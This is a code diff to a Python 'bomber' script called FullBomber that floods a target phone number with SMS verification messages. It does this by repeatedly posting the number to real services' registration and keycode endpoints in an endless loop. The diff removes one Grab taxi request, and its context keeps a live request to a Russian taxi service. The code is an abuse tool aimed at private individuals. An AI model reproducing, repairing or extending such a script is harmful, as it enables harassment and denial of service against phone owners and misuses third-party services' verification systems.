@@ -6,7 +6,7 @@ banner = """
 |                                                    |
 | [--] Name: FullBomber                              |
 |                                                    |
-| [--] Have Services: 51                             |
+| [--] Have Services: 50                             |
 |                                                    |
 | [--] Created by: @DarkSuana                        |
 |                                                    |
@@ -41,11 +41,6 @@ iteration = 0
 while True:
 	_email = _name+f'{iteration}'+'@gmail.com'
 	email = _name+f'{iteration}'+'@gmail.com'
-	try:
-		requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register', data={'phoneNumber': _phone,'countryCode': 'ID','name': 'test','email': 'mail@mail.com','deviceToken': '*'}, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})
-		print(colored("[+] Grab отправлено"), 'lawngreen')
-	except:
-		print('[-] Не отправлено!')
 
 	try:
 		requests.post('https://moscow.rutaxi.ru/ajax_keycode.html', data={'l': _phone9}).json()["res"]
